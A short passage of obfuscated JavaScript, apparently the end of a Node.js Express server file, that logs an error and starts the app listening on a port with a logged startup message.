_0x9eed=_0x360ae3;console['error'](_0x9eed(0xf5),_0x3e4e59);}),app['listen'](PORT,()=>console['log'](_0x360ae3(0x118)+PORT+'!'));
